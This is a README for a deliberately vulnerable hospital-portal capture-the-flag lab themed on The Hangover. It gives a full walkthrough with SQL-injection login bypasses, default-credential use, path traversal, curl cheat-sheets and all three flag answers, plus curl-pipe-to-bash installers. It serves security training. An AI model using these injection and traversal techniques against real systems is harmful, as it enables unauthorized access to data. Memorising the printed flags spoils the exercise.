# Mercury General Hospital — CTF Machine 2

[![Difficulty](https://img.shields.io/badge/Difficulty-Easy%20%E2%80%93%20Medium-yellow?style=flat-square)](https://github.com/at0m-b0mb/Mercury-General-Hospital-v2)
[![Flags](https://img.shields.io/badge/Flags-3-brightgreen?style=flat-square)](https://github.com/at0m-b0mb/Mercury-General-Hospital-v2)
[![Node](https://img.shields.io/badge/Node.js-v16%2B-339933?style=flat-square&logo=node.js)](https://nodejs.org/)
[![Docker](https://img.shields.io/badge/Docker-supported-2496ED?style=flat-square&logo=docker)](https://www.docker.com/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey?style=flat-square)](https://github.com/at0m-b0mb/Mercury-General-Hospital-v2)
[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
[![Forked from](https://img.shields.io/badge/Forked%20from-Krishita17%2FMachine--2--ethical--hacking--ctf-orange?style=flat-square&logo=github)](https://github.com/Krishita17/Machine-2-ethical-hacking-ctf)

---

> *Las Vegas. June 15, 2024. 2:47 AM.*
> *A man walks into Mercury General Hospital clutching his jaw — missing a molar he pulled himself.*
> *He was dropped off by a short, angry Asian man in a silver Mercedes who sped away before anyone could ask questions.*
> *The security footage captured everything. Someone tried to bury it.*
> *Find the flags before the trail goes cold.*

---

A fully self-contained CTF web application disguised as a hospital patient portal. Three flags are hidden behind real-world web vulnerabilities — default credentials, robots.txt enumeration, hidden backup files, and Base64-encoded secrets. Themed after **The Hangover (2009)**.

> **Heads up:** This is Machine 2 in a multi-part CTF series. Solving all three flags reveals the address of **Machine 3: Mr. Chow's Warehouse**.

---

## Table of Contents

1. [Story Background](#-story-background)
2. [Prerequisites](#-prerequisites)
3. [One-Line Install](#-one-line-install-quickest)
4. [Quick Start — Windows](#-quick-start--windows)
5. [Quick Start — macOS / Linux](#-quick-start--macos--linux)
6. [Quick Start — Manual Node.js](#-quick-start--manual-nodejs)
7. [Quick Start — Docker](#-quick-start--docker)
8. [Configuration](#-configuration)
9. [Network Setup (Multi-machine CTF)](#-network-setup-multi-machine-ctf)
10. [Project Structure](#️-project-structure)
11. [All Pages & Routes](#-all-pages--routes)
12. [Flags Overview](#-flags-overview)
13. [Exploitation Walkthrough](#-exploitation-walkthrough)
14. [Bonus Discoveries](#-bonus-discoveries)
15. [Running the Tests](#-running-the-tests)
16. [Tools Cheat-Sheet](#️-tools-cheat-sheet)
17. [CTF Safety Notice](#️-ctf-safety-notice)
18. [Credits & Attribution](#-credits--attribution)

---

## 🎬 Story Background

It started like any other graveyard shift at Mercury General Hospital.

At **2:47 AM** on June 15, 2024, three heavily intoxicated men stumbled through the Emergency Room doors. The patient — **Stuart "Stu" Price** — had pulled out his own molar. He claimed it was voluntary. His blood alcohol was 0.24. His face had what appeared to be a temporary tattoo.

His companions, **Phil Wenneck** and **Alan Garner**, waited in the lobby. They were dropped off by a fourth man — short, dressed in a black leather jacket, driving a silver **Mercedes-Benz E-Class** with Nevada plate `NV-CHOW-88`. He identified himself only as **Mr. Chow**. He did not stay.

At **3:13 AM**, the security camera in Parking Lot B captured all four men loading something large and heavy into the trunk of Mr. Chow's car. A hospital administrator later edited that footage. The backup was never cleaned up.

A special prescription for Stuart Price — hidden from the public records — contains coordinates encoded in Base64, pointing to a warehouse in the Las Vegas industrial district.

**Your mission: find all 3 flags by exploiting the hospital's insecure web application.**

---

## ✅ Prerequisites

You need **one** of the following:

| Method | What you need |
|--------|---------------|
| One-line installer | [Node.js v16+](https://nodejs.org/) + internet access |
| Windows scripts (`setup.bat` / `setup.ps1`) | [Node.js v16+](https://nodejs.org/) + repo already cloned |
| Manual Node.js | [Node.js v16+](https://nodejs.org/) + repo cloned |
| Docker | [Docker Desktop](https://www.docker.com/products/docker-desktop/) |

Check if Node.js is already installed:
```bash
node --version
```
Expected: `v16.x.x` or higher. If not installed, download from [nodejs.org](https://nodejs.org/).

---

## ⚡ One-Line Install (Quickest)

No cloning required. Each script automatically checks prerequisites, downloads the repo, installs dependencies, and starts the server.

### Windows (PowerShell — run as Administrator for ports below 1024)

```powershell
irm https://raw.githubusercontent.com/at0m-b0mb/Mercury-General-Hospital-v2/main/install.ps1 | iex
```

> Already have the files? Run: `powershell -ExecutionPolicy Bypass -File install.ps1`

### macOS / Linux (bash)

```bash
curl -fsSL https://raw.githubusercontent.com/at0m-b0mb/Mercury-General-Hospital-v2/main/install.sh | bash
```

> Already have the files? Run: `chmod +x install.sh && ./install.sh`

**Both scripts will automatically:**

| Step | What happens |
|------|-------------|
| 1 | Check that Node.js and npm are installed (with install instructions if missing) |
| 2 | Clone the repo — or update an existing clone — or download a ZIP/tar.gz if git is unavailable |
| 3 | Run `npm install` to install dependencies |
| 4 | Create `.env` from `.env.example` if it doesn't already exist |
| 5 | Ask which port to use (default: **3000**) with a warning if you pick a privileged port |
| 6 | Start the server and print the URL |

---

## 🚀 Quick Start — Windows

### Option A — Command Prompt (`setup.bat`)

1. Open **Command Prompt** (`Win + R` → `cmd` → Enter)
2. Navigate to the project folder:
   ```bat
   cd C:\path\to\Mercury-General-Hospital-v2
   ```
3. Run:
   ```bat
   setup.bat
   ```
4. Press **Enter** for default port (`80`), or type `3000` / `8080` to avoid needing admin rights.
5. Open your browser to the URL shown.

> **Port 80 on Windows** requires running Command Prompt as Administrator (right-click → *Run as administrator*). Use port 3000 or 8080 to avoid this.

---

### Option B — PowerShell (`setup.ps1`)

1. Right-click `setup.ps1` → **"Run with PowerShell"**  
   — or open PowerShell and run:
   ```powershell
   powershell -ExecutionPolicy Bypass -File setup.ps1
   ```
2. Enter a port when prompted (press Enter for default `80`, or type `3000`).
3. Open your browser to the URL shown.

---

## 🍎 Quick Start — macOS / Linux

Use `install.sh` for the full automated setup (see [One-Line Install](#-one-line-install-quickest) above), or do it manually:

```bash
# Clone the repo
git clone https://github.com/at0m-b0mb/Mercury-General-Hospital-v2.git
cd Mercury-General-Hospital-v2

# Install dependencies
npm install

# Start the server (default port 3000)
PORT=3000 node server.js
```

Open **http://localhost:3000** in your browser.

---

## 💻 Quick Start — Manual Node.js

Full control, no scripts.

**Step 1 — Install dependencies**
```bash
cd Mercury-General-Hospital-v2
npm install
```

**Step 2 — Start the server**

*Default port (80 — requires admin/root):*
```bash
node server.js
```

*Custom port (no admin needed — recommended):*

| Platform | Command |
|----------|---------|
| macOS / Linux | `PORT=3000 node server.js` |
| Windows CMD | `set PORT=3000 && node server.js` |
| Windows PowerShell | `$env:PORT=3000; node server.js` |

**Step 3 — Open the site**

Navigate to **http://localhost:3000** (or whichever port you chose).

You should see the Mercury General Hospital home page.

---

## 🐳 Quick Start — Docker

Works on Windows, macOS, and Linux. No Node.js installation required.

```bash
# Build and start in the background
docker-compose up --build -d

# Check it's running
docker-compose ps

# Stop the server
docker-compose down
```

Navigate to **http://localhost** once it's up.

> To use a different external port, edit `docker-compose.yml` and change `"80:80"` to `"3000:80"`, then rebuild with `docker-compose up --build`.

---

## 🔧 Configuration

The only configurable value is the port. Set the `PORT` environment variable before starting the server:

| Platform | Command |
|----------|---------|
| macOS / Linux | `PORT=3000 node server.js` |
| Windows CMD | `set PORT=3000 && node server.js` |
| Windows PowerShell | `$env:PORT=3000; node server.js` |
| Docker | Edit `docker-compose.yml` → change `"80:80"` to `"3000:80"` |

To persist the port setting, copy `.env.example` to `.env`:
```bash
# macOS / Linux
cp .env.example .env

# Windows CMD
copy .env.example .env
```
Then open `.env` and set `PORT=3000` (or any port you prefer).

---

## 🌐 Network Setup (Multi-Machine CTF)

To let players on the same network attack this machine from their own computers:

**Step 1 — Find the host machine's IP address**

```bash
# macOS / Linux
ip a   # or: ifconfig

# Windows CMD
ipconfig
```

Look for the **IPv4 Address** under your active network adapter (e.g. `192.168.1.50`).

**Step 2 — Allow inbound traffic through the firewall**

*Windows (run PowerShell as Administrator):*
```powershell
New-NetFirewallRule -DisplayName "CTF HTTP" -Direction Inbound -Protocol TCP -LocalPort 3000 -Action Allow
```

*macOS (if the macOS firewall is enabled):*
```bash
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add $(which node)
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp $(which node)
```

*Linux (ufw):*
```bash
sudo ufw allow 3000/tcp
```

**Step 3 — Share the URL with players**

```
http://192.168.1.50:3000/
```
*(Replace `192.168.1.50` with your actual IP and `3000` with your chosen port.)*

---

## 🗂️ Project Structure

```
Mercury-General-Hospital-v2/
│
├── server.js                    # Express web server — all routes defined here
├── package.json                 # npm metadata + "npm test" script
├── package-lock.json
│
├── install.ps1                  # ★ One-line Windows installer (clone + setup + start)
├── install.sh                   # ★ One-line Linux/macOS installer (clone + setup + start)
├── setup.bat                    # Windows quick-start (assumes repo already cloned)
├── setup.ps1                    # Windows quick-start (assumes repo already cloned)
├── Dockerfile                   # Docker image definition
├── docker-compose.yml           # One-command Docker deploy
├── .env.example                 # PORT environment variable template
│
├── data/                        # Backend data — served by API routes
│   ├── patients.json            #   Patient records  ◀ FLAG 3 is in record #3
│   ├── security_logs.json       #   Camera footage logs  ◀ FLAG 4 is in the backup log
│   ├── prescriptions.json       #   Prescriptions  ◀ FLAG 5 is encoded here
│   ├── users.json               #   Staff credentials (world-readable via /api/files)
│   └── system_config.bak        #   Server config backup with plaintext passwords
│
├── public/                      # Static frontend files served by Express
│   ├── index.html               #   Home page — HTML source contains hint comments
│   ├── portal.html              #   Patient self-service portal
│   ├── login.html               #   Staff login (vulnerable to default creds + SQL injection)
│   ├── dashboard.html           #   Staff dashboard — patient list and individual records
│   ├── appointments.html        #   Appointment schedule (Stuart Price listed)
│   ├── 404.html                 #   Custom 404 page — hints at hidden paths
│   ├── admin/
│   │   └── index.html           #   IT Admin panel — leaks credentials and file paths
│   ├── css/
│   │   └── style.css
│   └── js/
│       └── app.js               #   Frontend JS — comments reference all hidden API endpoints
│
├── tests/
│   └── test.js                  # Automated test suite (~40 assertions)
│
├── README.md                    # This file
├── WALKTHROUGH.md               # Progressive hint guide for players
├── FLAG_SOLUTIONS.md            # Full solutions — instructor / admin use only
└── LICENSE
```

---

## 🌍 All Pages & Routes

### Public Pages

| URL | Description |
|-----|-------------|
| `/` | Hospital home page |
| `/portal` | Patient self-service portal |
| `/login` | Staff login (vulnerable) |
| `/appointments` | Appointment schedule |
| `/robots.txt` | Site policy file — **key recon target** |
| `/admin/` | IT admin panel — not linked from any page |

### Staff Pages (reached after login)

| URL | Description |
|-----|-------------|
| `/dashboard` | Staff dashboard with patient list and records |

### API Endpoints

| Method | URL | Description |
|--------|-----|-------------|
| `POST` | `/api/login` | Authenticate (accepts `admin`/`admin` and SQL injection) |
| `GET` | `/api/patients` | List all patients |
| `GET` | `/api/patients/:id` | Get a single patient record by ID |
| `GET` | `/api/prescriptions` | Public prescription list |
| `GET` | `/api/prescriptions/hidden` | Hidden special prescription |
| `GET` | `/api/security/cameras` | Camera status list |
| `GET` | `/api/files?file=` | File reader (intentionally path-traversal vulnerable) |
| `GET` | `/api/hint` | In-universe hints |

### Hidden / Discoverable Paths

| URL | How to find it |
|-----|----------------|
| `/security/logs/` | Disclosed in `robots.txt` |
| `/security/logs/.backup_camera_04_full.log` | Listed in the `/security/logs/` directory response |
| `/backup/` | Disclosed in `robots.txt` |
| `/backup/prescription_encoded.txt` | Listed in the `/backup/` directory response |
| `/backup/system_config.bak` | Listed in `/backup/` and referenced in `/admin/` |
| `/admin/` | Disclosed in `robots.txt` and hinted on the 404 page |

---

## 🏁 Flags Overview

| # | Name | Flag | Core Technique |
|---|------|------|----------------|
| 3 | The Dental Record | `FLAG{dental_record_stu_2_47_am}` | Default credentials → patient record enumeration |
| 4 | The Security Footage | `FLAG{security_footage_mercedes_3_15_am}` | `robots.txt` → directory listing → hidden dot-file backup |
| 5 | The Prescription | `FLAG{prescription_warehouse_coordinates}` | `robots.txt` → backup directory → Base64 decode |

> Flags are numbered **3, 4, 5** — Flags 1 and 2 belong to the earlier machines in this series.

---

## 🔍 Exploitation Walkthrough

### FLAG 3 — "The Dental Record"

**Vulnerability:** Weak authentication (default credentials / SQL injection bypass) + unauthenticated patient record enumeration

---

#### Step 1 — Identify the login page

Go to the staff login:
```
http://localhost:3000/login
```
Or follow the **Staff Login** link in the site navigation.

#### Step 2 — Bypass authentication

**Method A — Default credentials** *(easiest)*

| Field | Value |
|-------|-------|
| Username | `admin` |
| Password | `admin` |

**Method B — SQL injection bypass**

Enter either of the following as the username (any password works):
```
' OR '1'='1
```
```
' OR 1=1--
```

Both methods return a valid session token and redirect you to `/dashboard`.

#### Step 3 — Browse the patient list

The dashboard calls `/api/patients`. Five patients are listed. Patient **#3** stands out — admitted at **2:47 AM** to **Dental / Emergency**.

#### Step 4 — Read the full patient record

Click **Stuart "Stu" Price** in the dashboard, or call the API directly:
```
http://localhost:3000/api/patients/3
```

Read the `notes` field carefully:

> *"Patient arrived at 2:47 AM with a freshly extracted molar. Patient claims he VOLUNTARILY pulled his own tooth 'to prove his love'…
> dropped off by a SHORT ANGRY ASIAN MAN who identified himself only as 'Mr. Chow' and left immediately in a silver Mercedes…
> **FLAG{dental_record_stu_2_47_am}**"*

```
FLAG{dental_record_stu_2_47_am}
```

---

### FLAG 4 — "The Security Footage"

**Vulnerability:** `robots.txt` enumeration → directory listing → dot-prefixed hidden backup file

---

#### Step 1 — Check robots.txt

Always start recon here:
```
http://localhost:3000/robots.txt
```

```
User-agent: *
Disallow: /security/logs/
Disallow: /api/prescriptions/hidden
Disallow: /backup/
Disallow: /admin/

# Note: Prescription backup contains encoded patient coordinates
# Encoding: Base64 > ROT13
```

The `/security/logs/` path is worth investigating immediately.

#### Step 2 — List the security logs directory

```
http://localhost:3000/security/logs/
```

Response:
```json
{
  "files": [
    "camera_01_main_entrance.log",
    "camera_02_emergency_room.log",
    "camera_03_parking_lot_a.log",
    "camera_04_parking_lot_b.log",
    "camera_05_rear_loading_dock.log",
    ".backup_camera_04_full.log"
  ],
  "note": "Backup files contain unedited footage data"
}
```

`.backup_camera_04_full.log` — the dot prefix marks it as a hidden/system file that wasn't cleaned up. The note confirms backup files contain **unedited** footage.

#### Step 3 — Confirm the normal log is redacted

```
http://localhost:3000/security/logs/camera_04_parking_lot_b.log
```

Two entries at **03:10** and **03:20** are marked `[FOOTAGE REDACTED BY ADMIN]`. Someone edited this file on purpose.

#### Step 4 — Read the unredacted backup

```
http://localhost:3000/security/logs/.backup_camera_04_full.log
```

The backup contains the full, unedited Parking Lot B footage. At **03:15:00**:

```
[03:10:30] Individuals identified:
           - Male 1: Tall, dark hair (Phil Wenneck)
           - Male 2: Medium build, missing tooth, bleeding (Stu Price)
           - Male 3: Heavy-set, carrying a satchel (Alan Garner)
           - Male 4: Short Asian male, leather jacket (Mr. Chow)

[03:13:00] All four males observed LOADING SOMETHING HEAVY into the trunk of the Mercedes.

[03:15:00] License plate captured: NV-CHOW-88
[03:15:00] Vehicle: Silver Mercedes-Benz E-Class, 2023 model
[03:15:00] Registration address: 1547 Industrial Blvd, Las Vegas, NV 89101
[03:15:00] NOTE: Address corresponds to a WAREHOUSE in the industrial district
[03:15:00]
[03:15:00] FLAG{security_footage_mercedes_3_15_am}
```

```
FLAG{security_footage_mercedes_3_15_am}
```

---

### FLAG 5 — "The Prescription"

**Vulnerability:** `robots.txt` → backup directory listing → Base64 decoding

---

#### Step 1 — Revisit robots.txt

You already have this from FLAG 4:
```
Disallow: /backup/
# Encoding: Base64 > ROT13
```

#### Step 2 — List the backup directory

```
http://localhost:3000/backup/
```

```json
{
  "files": [
    "patient_db_backup_2024.sql",
    "prescription_encoded.txt",
    "system_config.bak"
  ]
}
```

#### Step 3 — Read the encoded prescription

```
http://localhost:3000/backup/prescription_encoded.txt
```

```
=== MERCURY GENERAL HOSPITAL ===
=== SECURE PRESCRIPTION BACKUP ===
=== Patient: Stuart Price - RX-003-SPECIAL ===

ENCODED PAYLOAD (Base64):
RkxBR3twcmVzY3JpcHRpb25fd2FyZWhvdXNlX2Nvb3JkaW5hdGVzfQ==

DECODE INSTRUCTIONS:
1. Apply Base64 decoding to the payload above
2. The result is your flag
```

#### Step 4 — Decode the Base64 payload

**macOS / Linux:**
```bash
echo "RkxBR3twcmVzY3JpcHRpb25fd2FyZWhvdXNlX2Nvb3JkaW5hdGVzfQ==" | base64 -d
```

**Windows PowerShell:**
```powershell
[System.Text.Encoding]::UTF8.GetString(
  [System.Convert]::FromBase64String("RkxBR3twcmVzY3JpcHRpb25fd2FyZWhvdXNlX2Nvb3JkaW5hdGVzfQ==")
)
```

Result:
```
FLAG{prescription_warehouse_coordinates}
```

**Alternative path — hidden API endpoint:**

The same encoded flag is also reachable via:
```
http://localhost:3000/api/prescriptions/hidden
```
This returns the `encoded_coordinates` field containing the same Base64 string.

---

## 🎁 Bonus Discoveries

These are not required to capture the three flags, but they reward thorough enumeration and add depth to the story.

### The Admin Panel — Credential Leak

`robots.txt` disallows `/admin/`. Visiting it reveals an IT admin panel with no authentication:
```
http://localhost:3000/admin/
```

What you find there:
- Confirms default credentials `admin` / `admin` **have never been changed** (ticket ITK-2241 still open since deployment)
- Lists all staff accounts with last login times
- References exposed file paths including `/api/files?file=users.json` and `/backup/system_config.bak`
- Notes that Camera 04 backup files were *"not cleaned after admin edited footage"*

### Staff Credentials (Directory Traversal)

The `/api/files?file=` endpoint reads files relative to the `data/` directory with no path sanitisation:
```
http://localhost:3000/api/files?file=users.json
```

Returns all staff accounts with **plaintext passwords**:

| Username | Password | Role |
|----------|----------|------|
| `admin` | `admin` | Administrator |
| `nurse1` | `mercury2024` | Nurse |
| `dr.valsh` | `Valsh@123` | Doctor |

### System Config Backup — Plaintext Credentials

```
http://localhost:3000/backup/system_config.bak
```

Contains the session secret, database paths, default admin password in plaintext, and notes that the backup log prefix was never cleaned after the camera footage edit. This corroborates every other finding.

### Appointment Schedule

```
http://localhost:3000/appointments
```

Stuart Price has a **dental follow-up on June 17** — though given his history of no-showing two previous appointments, attendance seems unlikely.

### Custom 404 Page

Any path that doesn't exist returns a styled hospital-branded 404 page that helpfully lists known paths including `/admin/`, `/robots.txt`, and the camera system. Useful if you get lost during enumeration.

---

## 🧪 Running the Tests

The test suite verifies every flag, page, and route is working correctly. Run it after any code change to confirm nothing is broken.

**Step 1 — Start the server** (in one terminal):
```bash
PORT=3000 node server.js
```

**Step 2 — Run the tests** (in a second terminal):
```bash
PORT=3000 npm test
```

**Windows CMD:**
```bat
set PORT=3000 && node server.js
REM (in a second terminal)
set PORT=3000 && npm test
```

Expected output:
```
🏥 Mercury General Hospital CTF - Test Suite (port 3000)

--- FLAG 3: The Dental Record ---
  ✅ PASS: admin/admin login succeeds
  ✅ PASS: SQL injection pattern login bypass works (' OR '1'='1)
  ✅ PASS: Patient list returns 5 patients
  ✅ PASS: Patient ID 3 record accessible
  ✅ PASS: Patient 3 is Stu Price
  ✅ PASS: ✅ FLAG 3 found in patient 3 record: FLAG{dental_record_stu_2_47_am}
  ✅ PASS: Non-existent patient returns 404

--- FLAG 4: The Security Footage ---
  ✅ PASS: robots.txt accessible
  ✅ PASS: robots.txt reveals /security/logs/
  ✅ PASS: Security cameras endpoint accessible
  ✅ PASS: /security/logs/ directory listing accessible
  ✅ PASS: Directory listing reveals hidden .backup_camera_04_full.log
  ✅ PASS: Backup camera log accessible
  ✅ PASS: ✅ FLAG 4 found in backup camera log: FLAG{security_footage_mercedes_3_15_am}
  ✅ PASS: License plate NV-CHOW-88 visible in backup log
  ✅ PASS: Normal camera 04 log has redacted footage (must use backup)

--- FLAG 5: The Prescription ---
  ✅ PASS: robots.txt reveals /api/prescriptions/hidden
  ✅ PASS: robots.txt reveals /backup/ directory
  ✅ PASS: /backup/ directory accessible
  ✅ PASS: Encoded prescription file contains Base64 payload
  ✅ PASS: ✅ FLAG 5 obtained by Base64 decoding the payload: FLAG{prescription_warehouse_coordinates}

--- New Pages & Routes ---
  ✅ PASS: /admin/ page accessible
  ✅ PASS: /admin/ page leaks default credentials (admin / admin)
  ✅ PASS: /appointments page accessible
  ✅ PASS: /appointments page lists Stuart Price appointment
  ✅ PASS: Missing pages return 404 status
  ✅ PASS: /backup/system_config.bak contains plaintext admin password
  ✅ PASS: /admin redirects to /admin/

========================================
Results: 40 passed, 0 failed
========================================
🎉 All tests passed! All 3 flags are correctly placed.
```

---

## 🛠️ Tools Cheat-Sheet

### Browser Only (no extra tools needed)

Visit each URL directly in the address bar. Use **View Source** (`Ctrl+U` / `Cmd+U`) to read HTML comments that contain in-universe hints.

---

### curl

```bash
# ── Recon ──────────────────────────────────────────────────────
curl http://localhost:3000/robots.txt

# ── FLAG 3 ─────────────────────────────────────────────────────
# Login with default credentials
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Login with SQL injection
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}'

# Read patient 3
curl http://localhost:3000/api/patients/3

# ── FLAG 4 ─────────────────────────────────────────────────────
curl http://localhost:3000/security/logs/
curl "http://localhost:3000/security/logs/.backup_camera_04_full.log"

# ── FLAG 5 ─────────────────────────────────────────────────────
curl http://localhost:3000/backup/
curl http://localhost:3000/backup/prescription_encoded.txt

# Decode the Base64 payload
echo "RkxBR3twcmVzY3JpcHRpb25fd2FyZWhvdXNlX2Nvb3JkaW5hdGVzfQ==" | base64 -d

# ── Bonus ──────────────────────────────────────────────────────
curl "http://localhost:3000/api/files?file=users.json"
curl http://localhost:3000/backup/system_config.bak
curl http://localhost:3000/admin/
curl http://localhost:3000/api/hint
```

---

### Windows PowerShell

```powershell
# Recon
Invoke-WebRequest http://localhost:3000/robots.txt | Select-Object -Expand Content

# Login — default credentials
Invoke-RestMethod -Method POST -Uri http://localhost:3000/api/login `
  -ContentType "application/json" `
  -Body '{"username":"admin","password":"admin"}'

# FLAG 3 — patient record
Invoke-RestMethod http://localhost:3000/api/patients/3

# FLAG 4 — security logs
Invoke-WebRequest http://localhost:3000/security/logs/ | Select-Object -Expand Content
Invoke-WebRequest "http://localhost:3000/security/logs/.backup_camera_04_full.log" | Select-Object -Expand Content

# FLAG 5 — decode Base64
$payload = "RkxBR3twcmVzY3JpcHRpb25fd2FyZWhvdXNlX2Nvb3JkaW5hdGVzfQ=="
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
```

---

### Burp Suite

1. Set your browser proxy to `127.0.0.1:8080`
2. Enable Burp **Proxy → Intercept**
3. Browse the site — all requests appear in **HTTP History**
4. Use **Repeater** to craft custom requests (SQL injection payloads, custom file paths, dot-file requests)
5. Use **Target → Site Map** or the **Spider/Crawler** to auto-discover hidden paths

---

## ⚠️ CTF Safety Notice

This application is **intentionally insecure by design**. It simulates real-world misconfigurations for educational purposes only.

| Do | Don't |
|----|-------|
| ✅ Run this in an isolated, private lab or CTF environment | ❌ Expose this to the public internet |
| ✅ Expose it only on a local or private network with known participants | ❌ Run this on a production or shared machine |
| ✅ Use this to learn about web vulnerabilities | ❌ Use the techniques here against systems you don't own |

**Vulnerabilities intentionally included:**
- Unchanged default credentials (`admin` / `admin`)
- SQL injection pattern bypass on the login endpoint
- Unauthenticated patient record enumeration via sequential IDs
- `robots.txt` revealing sensitive directory structure
- Directory listing exposing hidden backup files
- Dot-prefixed file left uncleaned after admin edits
- Unprotected backup directory (`/backup/`)
- Path traversal via `/api/files?file=` (no sanitisation)
- Exposed IT admin panel with no authentication
- Plaintext credentials stored in an accessible config backup
- Sensitive data encoded (not encrypted) in a world-readable file

---

## 🙏 Credits & Attribution

| Role | Credit |
|------|--------|
| **Original challenge author** | [Krishita17](https://github.com/Krishita17) — original work at [`Krishita17/Machine-2-ethical-hacking-ctf`](https://github.com/Krishita17/Machine-2-ethical-hacking-ctf) |
| **This fork / v2 maintainer** | [at0m-b0mb](https://github.com/at0m-b0mb) — added cross-platform installers, automated test suite, admin panel, appointments page, bug fixes, and this README |
| **Theme** | Based on *The Hangover* (2009, dir. Todd Phillips) — all characters are fictional and used for educational parody |

This repository is a fork of Krishita17's original CTF challenge, extended with additional pages, a comprehensive test suite, and installation scripts for all major platforms. All flag content and core narrative were authored by Krishita17.

---

## 📖 Complete Story — Spoilers

After solving all three flags, the full picture comes together:

1. **FLAG 3 — The Hospital Record** — Stu Price checked himself in at 2:47 AM, missing a molar he claims he pulled himself. Blood alcohol 0.24. Dropped off by Mr. Chow. Discharged against medical advice at 4:15 AM with companions Phil and Alan. *(FLAG{dental_record_stu_2_47_am})*

2. **FLAG 4 — The Parking Lot Footage** — At 3:13 AM, all four men loaded something heavy into Mr. Chow's silver Mercedes (plate `NV-CHOW-88`, registered to *Leslie Chow*). An administrator edited the security footage to hide this — but forgot to delete the backup copy. *(FLAG{security_footage_mercedes_3_15_am})*

3. **FLAG 5 — The Encoded Coordinates** — A special prescription hidden in the backup directory contains Base64-encoded coordinates: `36.1156 N, -115.1734 W` → **1547 Industrial Blvd, Las Vegas, NV 89101** — Mr. Chow's warehouse. *(FLAG{prescription_warehouse_coordinates})*

This address leads directly to **Machine 3: Mr. Chow's Warehouse Server**.

---

*&copy; 2024 Mercury General Hospital CTF. For educational use only. This is a fictional scenario — any resemblance to real hospitals or persons is coincidental and unintentional.*
